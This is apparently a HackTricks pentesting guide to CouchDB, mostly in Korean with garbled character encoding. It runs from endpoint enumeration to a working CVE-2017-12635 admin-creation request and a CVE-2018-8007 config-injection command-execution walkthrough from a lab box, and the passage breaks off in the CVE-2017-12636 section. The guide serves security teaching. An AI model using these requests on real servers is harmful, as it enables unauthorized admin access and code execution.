# 5984,6984 - Pentesting CouchDB

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **ê¸°ë³¸ ì •ë³´**

**CouchDB**ëŠ” **ë¬¸ì„œ ì§€í–¥ ë°ì´í„°ë² ì´ìŠ¤**ë¡œ, ê° **ë¬¸ì„œ** ë‚´ì—ì„œ **í‚¤-ê°’ ë§µ** êµ¬ì¡°ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°ì´í„°ë¥¼ ì¡°ì§í•˜ëŠ” ë‹¤ì¬ë‹¤ëŠ¥í•˜ê³  ê°•ë ¥í•œ ë°ì´í„°ë² ì´ìŠ¤ì…ë‹ˆë‹¤. ë¬¸ì„œ ë‚´ì˜ í•„ë“œëŠ” **í‚¤/ê°’ ìŒ, ë¦¬ìŠ¤íŠ¸ ë˜ëŠ” ë§µ**ìœ¼ë¡œ í‘œí˜„ë  ìˆ˜ ìˆì–´ ë°ì´í„° ì €ì¥ ë° ê²€ìƒ‰ì˜ ìœ ì—°ì„±ì„ ì œê³µí•©ë‹ˆë‹¤.

CouchDBì— ì €ì¥ëœ ëª¨ë“  **ë¬¸ì„œ**ëŠ” ë¬¸ì„œ ìˆ˜ì¤€ì—ì„œ **ê³ ìœ  ì‹ë³„ì**(`_id`)ê°€ í• ë‹¹ë©ë‹ˆë‹¤. ë˜í•œ, ë°ì´í„°ë² ì´ìŠ¤ì— ì €ì¥ëœ ëª¨ë“  ìˆ˜ì • ì‚¬í•­ì€ **ìˆ˜ì • ë²ˆí˜¸**(`_rev`)ê°€ í• ë‹¹ë©ë‹ˆë‹¤. ì´ ìˆ˜ì • ë²ˆí˜¸ëŠ” **ë³€ê²½ ì‚¬í•­ì˜ íš¨ìœ¨ì ì¸ ì¶”ì  ë° ê´€ë¦¬**ë¥¼ ê°€ëŠ¥í•˜ê²Œ í•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ ë‚´ì—ì„œ ë°ì´í„°ì˜ ìš©ì´í•œ ê²€ìƒ‰ ë° ë™ê¸°í™”ë¥¼ ì´‰ì§„í•©ë‹ˆë‹¤.

**ê¸°ë³¸ í¬íŠ¸:** 5984(http), 6984(https)
```
PORT      STATE SERVICE REASON
5984/tcp  open  unknown syn-ack
```
## **ìë™ ì—´ê±°**
```bash
nmap -sV --script couchdb-databases,couchdb-stats -p <PORT> <IP>
msf> use auxiliary/scanner/couchdb/couchdb_enum
```
## ìˆ˜ë™ ì—´ê±°

### ë°°ë„ˆ
```
curl http://IP:5984/
```
ì´ê²ƒì€ ì„¤ì¹˜ëœ CouchDB ì¸ìŠ¤í„´ìŠ¤ì— GET ìš”ì²­ì„ ë³´ëƒ…ë‹ˆë‹¤. ì‘ë‹µì€ ë‹¤ìŒ ì¤‘ í•˜ë‚˜ì™€ ë¹„ìŠ·í•´ì•¼ í•©ë‹ˆë‹¤:
```bash
{"couchdb":"Welcome","version":"0.10.1"}
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```
{% hint style="info" %}
couchdbì˜ ë£¨íŠ¸ì— ì ‘ê·¼í•  ë•Œ `401 Unauthorized`ì™€ ê°™ì€ ì‘ë‹µì„ ë°›ìœ¼ë©´: `{"error":"unauthorized","reason":"Authentication required."}` **ë°°ë„ˆë‚˜ ë‹¤ë¥¸ ì—”ë“œí¬ì¸íŠ¸ì— ì ‘ê·¼í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.**
{% endhint %}

### ì •ë³´ ì—´ê±°

ë‹¤ìŒì€ **GET** ìš”ì²­ìœ¼ë¡œ ì ‘ê·¼í•˜ì—¬ í¥ë¯¸ë¡œìš´ ì •ë³´ë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆëŠ” ì—”ë“œí¬ì¸íŠ¸ì…ë‹ˆë‹¤. [**couchdb ë¬¸ì„œì—ì„œ ë” ë§ì€ ì—”ë“œí¬ì¸íŠ¸ì™€ ìì„¸í•œ ì„¤ëª…ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**](https://docs.couchdb.org/en/latest/api/index.html).

* **`/_active_tasks`** ì‹¤í–‰ ì¤‘ì¸ ì‘ì—…ì˜ ëª©ë¡ìœ¼ë¡œ, ì‘ì—… ìœ í˜•, ì´ë¦„, ìƒíƒœ ë° í”„ë¡œì„¸ìŠ¤ IDë¥¼ í¬í•¨í•©ë‹ˆë‹¤.
* **`/_all_dbs`** CouchDB ì¸ìŠ¤í„´ìŠ¤ì˜ ëª¨ë“  ë°ì´í„°ë² ì´ìŠ¤ ëª©ë¡ì„ ë°˜í™˜í•©ë‹ˆë‹¤.
* **`/_cluster_setup`** í´ëŸ¬ìŠ¤í„° ì„¤ì • ë§ˆë²•ì‚¬ì— ë”°ë¼ ë…¸ë“œ ë˜ëŠ” í´ëŸ¬ìŠ¤í„°ì˜ ìƒíƒœë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.
* **`/_db_updates`** CouchDB ì¸ìŠ¤í„´ìŠ¤ì˜ ëª¨ë“  ë°ì´í„°ë² ì´ìŠ¤ ì´ë²¤íŠ¸ ëª©ë¡ì„ ë°˜í™˜í•©ë‹ˆë‹¤. ì´ ì—”ë“œí¬ì¸íŠ¸ë¥¼ ì‚¬ìš©í•˜ë ¤ë©´ `_global_changes` ë°ì´í„°ë² ì´ìŠ¤ê°€ ì¡´ì¬í•´ì•¼ í•©ë‹ˆë‹¤.
* **`/_membership`** í´ëŸ¬ìŠ¤í„°ì˜ ì¼ë¶€ì¸ ë…¸ë“œë¥¼ `cluster_nodes`ë¡œ í‘œì‹œí•©ë‹ˆë‹¤. `all_nodes` í•„ë“œëŠ” ì´ ë…¸ë“œê°€ ì•Œê³  ìˆëŠ” ëª¨ë“  ë…¸ë“œë¥¼ í‘œì‹œí•˜ë©°, í´ëŸ¬ìŠ¤í„°ì˜ ì¼ë¶€ì¸ ë…¸ë“œë„ í¬í•¨ë©ë‹ˆë‹¤.
* **`/_scheduler/jobs`** ë³µì œ ì‘ì—… ëª©ë¡ì…ë‹ˆë‹¤. ê° ì‘ì—… ì„¤ëª…ì—ëŠ” ì†ŒìŠ¤ ë° ëŒ€ìƒ ì •ë³´, ë³µì œ ID, ìµœê·¼ ì´ë²¤íŠ¸ì˜ ì´ë ¥ ë° ê¸°íƒ€ ëª‡ ê°€ì§€ ì •ë³´ê°€ í¬í•¨ë©ë‹ˆë‹¤.
* **`/_scheduler/docs`** ë³µì œ ë¬¸ì„œ ìƒíƒœ ëª©ë¡ì…ë‹ˆë‹¤. `completed` ë° `failed` ìƒíƒœì˜ ëª¨ë“  ë¬¸ì„œì— ëŒ€í•œ ì •ë³´ë¥¼ í¬í•¨í•©ë‹ˆë‹¤. ê° ë¬¸ì„œì— ëŒ€í•´ ë¬¸ì„œ ID, ë°ì´í„°ë² ì´ìŠ¤, ë³µì œ ID, ì†ŒìŠ¤ ë° ëŒ€ìƒ, ê¸°íƒ€ ì •ë³´ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.
* **`/_scheduler/docs/{replicator_db}`**
* **`/_scheduler/docs/{replicator_db}/{docid}`**
* **`/_node/{node-name}`** `/_node/{node-name}` ì—”ë“œí¬ì¸íŠ¸ëŠ” ìš”ì²­ì„ ì²˜ë¦¬í•˜ëŠ” ì„œë²„ì˜ Erlang ë…¸ë“œ ì´ë¦„ì„ í™•ì¸í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì •ë³´ì— ì ‘ê·¼í•˜ê¸° ìœ„í•´ `/_node/_local`ì— ì ‘ê·¼í•  ë•Œ ê°€ì¥ ìœ ìš©í•©ë‹ˆë‹¤.
* **`/_node/{node-name}/_stats`** `_stats` ë¦¬ì†ŒìŠ¤ëŠ” ì‹¤í–‰ ì¤‘ì¸ ì„œë²„ì˜ í†µê³„ë¥¼ í¬í•¨í•˜ëŠ” JSON ê°ì²´ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤. ë¦¬í„°ëŸ´ ë¬¸ìì—´ `_local`ì€ ë¡œì»¬ ë…¸ë“œ ì´ë¦„ì˜ ë³„ì¹­ìœ¼ë¡œ ì‚¬ìš©ë˜ë¯€ë¡œ, ëª¨ë“  í†µê³„ URLì—ì„œ `{node-name}`ì„ `_local`ë¡œ ëŒ€ì²´í•˜ì—¬ ë¡œì»¬ ë…¸ë“œì˜ í†µê³„ì™€ ìƒí˜¸ì‘ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **`/_node/{node-name}/_system`** \_system ë¦¬ì†ŒìŠ¤ëŠ” ì‹¤í–‰ ì¤‘ì¸ ì„œë²„ì˜ ë‹¤ì–‘í•œ ì‹œìŠ¤í…œ ìˆ˜ì¤€ í†µê³„ë¥¼ í¬í•¨í•˜ëŠ” JSON ê°ì²´ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤. í˜„ì¬ ë…¸ë“œ ì •ë³´ë¥¼ ì–»ê¸° ìœ„í•´ `{node-name}`ìœ¼ë¡œ `_local`ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **`/_node/{node-name}/_restart`**
* **`/_up`** ì„œë²„ê°€ ì‘ë™ ì¤‘ì´ë©° ìš”ì²­ì— ì‘ë‹µí•  ì¤€ë¹„ê°€ ë˜ì—ˆìŒì„ í™•ì¸í•©ë‹ˆë‹¤. [`maintenance_mode`](https://docs.couchdb.org/en/latest/config/couchdb.html#couchdb/maintenance\_mode)ê°€ `true` ë˜ëŠ” `nolb`ì¸ ê²½ìš°, ì—”ë“œí¬ì¸íŠ¸ëŠ” 404 ì‘ë‹µì„ ë°˜í™˜í•©ë‹ˆë‹¤.
* **`/_uuids`** CouchDB ì¸ìŠ¤í„´ìŠ¤ì—ì„œ í•˜ë‚˜ ì´ìƒì˜ ë²”ìš© ê³ ìœ  ì‹ë³„ì(UUID)ë¥¼ ìš”ì²­í•©ë‹ˆë‹¤.
* **`/_reshard`** ì™„ë£Œëœ ì‘ì—…, ì‹¤íŒ¨í•œ ì‘ì—…, ì‹¤í–‰ ì¤‘ì¸ ì‘ì—…, ì¤‘ì§€ëœ ì‘ì—… ë° ì´ ì‘ì—… ìˆ˜ì™€ í´ëŸ¬ìŠ¤í„°ì˜ ì¬ë¶„í•  ìƒíƒœë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.

ë” í¥ë¯¸ë¡œìš´ ì •ë³´ëŠ” ì—¬ê¸°ì—ì„œ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://lzone.de/cheat-sheet/CouchDB](https://lzone.de/cheat-sheet/CouchDB)

### **ë°ì´í„°ë² ì´ìŠ¤ ëª©ë¡**
```
curl -X GET http://IP:5984/_all_dbs
```
ë§Œì•½ ê·¸ ìš”ì²­ì´ **401 ê¶Œí•œ ì—†ìŒ**ìœ¼ë¡œ ì‘ë‹µí•œë‹¤ë©´, ë°ì´í„°ë² ì´ìŠ¤ì— ì ‘ê·¼í•˜ê¸° ìœ„í•´ **ìœ íš¨í•œ ìê²© ì¦ëª…**ì´ í•„ìš”í•©ë‹ˆë‹¤:
```
curl -X GET http://user:password@IP:5984/_all_dbs
```
ìœ íš¨í•œ ìê²© ì¦ëª…ì„ ì°¾ê¸° ìœ„í•´ **ì„œë¹„ìŠ¤ë¥¼** [**ë¸Œë£¨íŠ¸í¬ìŠ¤ ì‹œë„**](../generic-methodologies-and-resources/brute-force.md#couchdb)í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë‹¤ìŒì€ **ì¶©ë¶„í•œ ê¶Œí•œ**ì´ ìˆì–´ ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ë‚˜ì—´í•  ìˆ˜ ìˆì„ ë•Œì˜ couchdb **ì‘ë‹µ** **ì˜ˆì‹œ**ì…ë‹ˆë‹¤(ë‹¨ìˆœíˆ ë°ì´í„°ë² ì´ìŠ¤ ëª©ë¡ì…ë‹ˆë‹¤):
```bash
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```
### Database Info

ë°ì´í„°ë² ì´ìŠ¤ ì´ë¦„ì— ì ‘ê·¼í•˜ì—¬ ì¼ë¶€ ë°ì´í„°ë² ì´ìŠ¤ ì •ë³´ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤(íŒŒì¼ ìˆ˜ ë° í¬ê¸° ë“±):
```bash
curl http://IP:5984/<database>
curl http://localhost:5984/simpsons
#Example response:
{"db_name":"simpsons","update_seq":"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ","sizes":{"file":62767,"external":1320,"active":2466},"purge_seq":0,"other":{"data_size":1320},"doc_del_count":0,"doc_count":7,"disk_size":62767,"disk_format_version":6,"data_size":2466,"compact_running":false,"instance_start_time":"0"}
```
### **ë¬¸ì„œ ëª©ë¡**

ë°ì´í„°ë² ì´ìŠ¤ ë‚´ì˜ ê° í•­ëª© ë‚˜ì—´
```bash
curl -X GET http://IP:5984/{dbname}/_all_docs
curl http://localhost:5984/simpsons/_all_docs
#Example response:
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
```
### **ë¬¸ì„œ ì½ê¸°**

ë°ì´í„°ë² ì´ìŠ¤ ë‚´ ë¬¸ì„œì˜ ë‚´ìš©ì„ ì½ìŠµë‹ˆë‹¤:
```bash
curl -X GET http://IP:5984/{dbname}/{id}
curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
#Example response:
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
```
## CouchDB Privilege Escalation [CVE-2017-12635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635)

Erlangê³¼ JavaScript JSON íŒŒì„œì˜ ì°¨ì´ ë•ë¶„ì— ë‹¤ìŒ ìš”ì²­ìœ¼ë¡œ `hacktricks:hacktricks` ìê²© ì¦ëª…ì„ ê°€ì§„ **ê´€ë¦¬ì ì‚¬ìš©ì**ë¥¼ **ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**:
```bash
curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' localhost:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
```
[**ì´ ì·¨ì•½ì ì— ëŒ€í•œ ë” ë§ì€ ì •ë³´ëŠ” ì—¬ê¸°ì—ì„œ í™•ì¸í•˜ì„¸ìš”**](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html).

## CouchDB RCE

### **Erlang ì¿ í‚¤ ë³´ì•ˆ ê°œìš”**

ì˜ˆì‹œ [ì—¬ê¸°ì—ì„œ](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

CouchDB ë¬¸ì„œì—ì„œëŠ” í´ëŸ¬ìŠ¤í„° ì„¤ì •ê³¼ ê´€ë ¨ëœ ì„¹ì…˜ì—ì„œ ([ë§í¬](http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup)), í´ëŸ¬ìŠ¤í„° ëª¨ë“œì—ì„œ CouchDBê°€ ì‚¬ìš©í•˜ëŠ” í¬íŠ¸ì— ëŒ€í•´ ë…¼ì˜í•©ë‹ˆë‹¤. ë…ë¦½ ì‹¤í–‰ ëª¨ë“œì™€ ë§ˆì°¬ê°€ì§€ë¡œ í¬íŠ¸ `5984`ê°€ ì‚¬ìš©ëœë‹¤ê³  ì–¸ê¸‰ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë˜í•œ, í¬íŠ¸ `5986`ì€ ë…¸ë“œ ë¡œì»¬ APIì— ì‚¬ìš©ë˜ë©°, ì¤‘ìš”í•˜ê²Œë„ Erlangì€ Erlang í¬íŠ¸ ë§¤í¼ ë°ëª¬(EPMD)ì„ ìœ„í•´ TCP í¬íŠ¸ `4369`ê°€ í•„ìš”í•˜ì—¬ Erlang í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ ë…¸ë“œ ê°„ í†µì‹ ì„ ìš©ì´í•˜ê²Œ í•©ë‹ˆë‹¤. ì´ ì„¤ì •ì€ ê° ë…¸ë“œê°€ ë‹¤ë¥¸ ëª¨ë“  ë…¸ë“œì™€ ì—°ê²°ëœ ë„¤íŠ¸ì›Œí¬ë¥¼ í˜•ì„±í•©ë‹ˆë‹¤.

í¬íŠ¸ `4369`ì— ëŒ€í•œ ì¤‘ìš”í•œ ë³´ì•ˆ ê¶Œê³ ê°€ ê°•ì¡°ë©ë‹ˆë‹¤. ì´ í¬íŠ¸ê°€ ì¸í„°ë„·ì´ë‚˜ ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ë„¤íŠ¸ì›Œí¬ì—ì„œ ì ‘ê·¼ ê°€ëŠ¥í•˜ê²Œ ë˜ë©´, ì‹œìŠ¤í…œì˜ ë³´ì•ˆì€ "ì¿ í‚¤"ë¼ëŠ” ê³ ìœ  ì‹ë³„ìì— í¬ê²Œ ì˜ì¡´í•˜ê²Œ ë©ë‹ˆë‹¤. ì´ ì¿ í‚¤ëŠ” ë³´í˜¸ ì¥ì¹˜ ì—­í• ì„ í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ì£¼ì–´ì§„ í”„ë¡œì„¸ìŠ¤ ëª©ë¡ì—ì„œ "monster"ë¼ëŠ” ì´ë¦„ì˜ ì¿ í‚¤ê°€ ê´€ì°°ë  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ì‹œìŠ¤í…œì˜ ë³´ì•ˆ í”„ë ˆì„ì›Œí¬ì—ì„œì˜ ìš´ì˜ ì—­í• ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.
```
www-data@canape:/$ ps aux | grep couchdb
root        744  0.0  0.0   4240   640 ?        Ss   Sep13   0:00 runsv couchdb
root        811  0.0  0.0   4384   800 ?        S    Sep13   0:00 svlogd -tt /var/log/couchdb
homer       815  0.4  3.4 649348 34524 ?        Sl   Sep13   5:33 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/b
```
ì›ê²© ì½”ë“œ ì‹¤í–‰(RCE) ë§¥ë½ì—ì„œ ì´ "ì¿ í‚¤"ê°€ ì–´ë–»ê²Œ ì•…ìš©ë  ìˆ˜ ìˆëŠ”ì§€ ì´í•´í•˜ê³ ì í•˜ëŠ” ë¶„ë“¤ì„ ìœ„í•´, ì¶”ê°€ ì½ê¸°ë¥¼ ìœ„í•œ ì „ìš© ì„¹ì…˜ì´ ë§ˆë ¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ì‹œìŠ¤í…œì— ëŒ€í•œ ì œì–´ë¥¼ ë‹¬ì„±í•˜ê¸° ìœ„í•´ ë¹„ì¸ê°€ ë°©ì‹ìœ¼ë¡œ Erlang ì¿ í‚¤ë¥¼ í™œìš©í•˜ëŠ” ë°©ë²•ë¡ ì„ ìì„¸íˆ ì„¤ëª…í•©ë‹ˆë‹¤. **[ì—¬ê¸°ì—ì„œ RCEë¥¼ ìœ„í•œ Erlang ì¿ í‚¤ ì•…ìš©ì— ëŒ€í•œ ìì„¸í•œ ê°€ì´ë“œë¥¼ íƒìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤](4369-pentesting-erlang-port-mapper-daemon-epmd.md#erlang-cookie-rce)**.

### **local.ini ìˆ˜ì •ìœ¼ë¡œ CVE-2018-8007 ì•…ìš©í•˜ê¸°**

ì˜ˆì œ [ì—¬ê¸°ì„œ](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

ìµœê·¼ ê³µê°œëœ ì·¨ì•½ì ì¸ CVE-2018-8007ì€ Apache CouchDBì— ì˜í–¥ì„ ë¯¸ì¹˜ë©°, ì•…ìš©í•˜ë ¤ë©´ `local.ini` íŒŒì¼ì— ëŒ€í•œ ì“°ê¸° ê¶Œí•œì´ í•„ìš”í•¨ì„ ë°í˜”ìŠµë‹ˆë‹¤. ë³´ì•ˆ ì œí•œìœ¼ë¡œ ì¸í•´ ì´ˆê¸° ëŒ€ìƒ ì‹œìŠ¤í…œì— ì§ì ‘ ì ìš©í•  ìˆ˜ëŠ” ì—†ì§€ë§Œ, íƒìƒ‰ ëª©ì ìœ¼ë¡œ `local.ini` íŒŒì¼ì— ëŒ€í•œ ì“°ê¸° ì ‘ê·¼ì„ ë¶€ì—¬í•˜ê¸° ìœ„í•´ ìˆ˜ì •ì´ ì´ë£¨ì–´ì¡ŒìŠµë‹ˆë‹¤. ì•„ë˜ì—ëŠ” ì´ ê³¼ì •ì„ ë³´ì—¬ì£¼ëŠ” ìì„¸í•œ ë‹¨ê³„ì™€ ì½”ë“œ ì˜ˆì œê°€ ì œê³µë©ë‹ˆë‹¤.

ë¨¼ì €, `local.ini` íŒŒì¼ì´ ì“°ê¸° ê°€ëŠ¥í•˜ë„ë¡ í™˜ê²½ì„ ì¤€ë¹„í•˜ë©°, ê¶Œí•œì„ ë‚˜ì—´í•˜ì—¬ í™•ì¸í•©ë‹ˆë‹¤:
```bash
root@canape:/home/homer/etc# ls -l
-r--r--r-- 1 homer homer 18477 Jan 20  2018 default.ini
-rw-rw-rw- 1 homer homer  4841 Sep 14 17:39 local.ini
-r--r--r-- 1 root  root   4841 Sep 14 14:30 local.ini.bk
-r--r--r-- 1 homer homer  1345 Jan 14  2018 vm.args
```
ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•´ `local.ini`ì˜ `cors/origins` êµ¬ì„±ì— ëŒ€í•´ curl ëª…ë ¹ì´ ì‹¤í–‰ë©ë‹ˆë‹¤. ì´ëŠ” `[os_daemons]` ì„¹ì…˜ ì•„ë˜ì— ìƒˆë¡œìš´ ì¶œì²˜ì™€ ì¶”ê°€ ëª…ë ¹ì„ ì£¼ì…í•˜ì—¬ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ê²ƒì„ ëª©í‘œë¡œ í•©ë‹ˆë‹¤:
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/cors/origins' -H "Accept: application/json" -H "Content-Type: application/json" -d "0xdf\n\n[os_daemons]\ntestdaemon = /usr/bin/touch /tmp/0xdf"
```
í›„ì† ê²€ì¦ì„ í†µí•´ `local.ini`ì— ì£¼ì…ëœ êµ¬ì„±ì„ í™•ì¸í•˜ê³ , ë³€ê²½ ì‚¬í•­ì„ ê°•ì¡°í•˜ê¸° ìœ„í•´ ë°±ì—…ê³¼ ëŒ€ì¡°í•©ë‹ˆë‹¤:
```bash
root@canape:/home/homer/etc# diff local.ini local.ini.bk
119,124d118
< [cors]
< origins = 0xdf
< [os_daemons]
< test_daemon = /usr/bin/touch /tmp/0xdf
```
Initially, the expected file (`/tmp/0xdf`) does not exist, indicating that the injected command has not been executed yet. Further investigation reveals that processes related to CouchDB are running, including one that could potentially execute the injected command:  
ì´ˆê¸°ì—ëŠ” ì˜ˆìƒë˜ëŠ” íŒŒì¼(`/tmp/0xdf`)ì´ ì¡´ì¬í•˜ì§€ ì•Šìœ¼ë©°, ì´ëŠ” ì£¼ì…ëœ ëª…ë ¹ì´ ì•„ì§ ì‹¤í–‰ë˜ì§€ ì•Šì•˜ìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ì¶”ê°€ ì¡°ì‚¬ë¥¼ í†µí•´ CouchDBì™€ ê´€ë ¨ëœ í”„ë¡œì„¸ìŠ¤ê°€ ì‹¤í–‰ë˜ê³  ìˆìœ¼ë©°, ê·¸ ì¤‘ í•˜ë‚˜ëŠ” ì£¼ì…ëœ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ê°€ëŠ¥ì„±ì´ ìˆìŠµë‹ˆë‹¤:
```bash
root@canape:/home/homer/bin# ps aux | grep couch
```
ì‹ë³„ëœ CouchDB í”„ë¡œì„¸ìŠ¤ë¥¼ ì¢…ë£Œí•˜ê³  ì‹œìŠ¤í…œì´ ìë™ìœ¼ë¡œ ì¬ì‹œì‘í•˜ë„ë¡ í—ˆìš©í•¨ìœ¼ë¡œì¨, ì£¼ì…ëœ ëª…ë ¹ì˜ ì‹¤í–‰ì´ ì´‰ë°œë˜ë©°, ì´ëŠ” ì´ì „ì— ì—†ë˜ íŒŒì¼ì˜ ì¡´ì¬ë¡œ í™•ì¸ë©ë‹ˆë‹¤:
```bash
root@canape:/home/homer/etc# kill 711
root@canape:/home/homer/etc# ls /tmp/0xdf
/tmp/0xdf
```
ì´ íƒìƒ‰ì€ `local.ini` íŒŒì¼ì— ëŒ€í•œ ì“°ê¸° ê°€ëŠ¥í•œ ì ‘ê·¼ ê¶Œí•œì´ í•„ìš”í•˜ë‹¤ëŠ” ì ì„ íŠ¹íˆ ê°•ì¡°í•˜ë©°, íŠ¹ì • ì¡°ê±´ì—ì„œ CVE-2018-8007ì˜ ì•…ìš© ê°€ëŠ¥ì„±ì„ í™•ì¸í•©ë‹ˆë‹¤. ì œê³µëœ ì½”ë“œ ì˜ˆì œì™€ ì ˆì°¨ì  ë‹¨ê³„ëŠ” í†µì œëœ í™˜ê²½ì—ì„œ ì•…ìš©ì„ ë³µì œí•˜ê¸° ìœ„í•œ ëª…í™•í•œ ê°€ì´ë“œë¥¼ ì œê³µí•©ë‹ˆë‹¤.

CVE-2018-8007ì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©ì€ mdsecì˜ ê¶Œê³ ë¥¼ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤: [CVE-2018-8007](https://www.mdsec.co.uk/2018/08/advisory-cve-2018-8007-apache-couchdb-remote-code-execution/).

### **local.iniì— ëŒ€í•œ ì“°ê¸° ê¶Œí•œìœ¼ë¡œ CVE-2017-12636 íƒìƒ‰í•˜ê¸°**

ì˜ˆì œ [ì—¬ê¸°ì—ì„œ](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

CouchDB í”„ë¡œì„¸ìŠ¤ë¥¼ í†µí•´ ì½”ë“œ ì‹¤í–‰ì„ ê°€ëŠ¥í•˜ê²Œ í•˜ëŠ” CVE-2017-12636ìœ¼ë¡œ ì•Œë ¤ì§„ ì·¨ì•½ì ì´ íƒìƒ‰ë˜ì—ˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ íŠ¹ì • êµ¬ì„±ìœ¼ë¡œ ì¸í•´ ì•…ìš©ì´ ë°©ì§€ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜¨ë¼ì¸ì—ì„œ ìˆ˜ë§ì€ ê°œë… ì¦ëª…(POC) ì°¸ì¡°ê°€ ìˆì§€ë§Œ, CouchDB ë²„ì „ 2ì—ì„œ ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•´ì„œëŠ” ì¡°ì •ì´ í•„ìš”í•˜ë©°, ì¼ë°˜ì ìœ¼ë¡œ íƒ€ê²ŸíŒ…ë˜ëŠ” ë²„ì „ 1.xì™€ ë‹¤ë¦…ë‹ˆë‹¤. ì´ˆê¸° ë‹¨ê³„ëŠ” CouchDB ë²„ì „ì„ í™•ì¸í•˜ê³  ì˜ˆìƒ ì¿¼ë¦¬ ì„œë²„ ê²½ë¡œê°€ ì—†ìŒì„ í™•ì¸í•˜ëŠ” 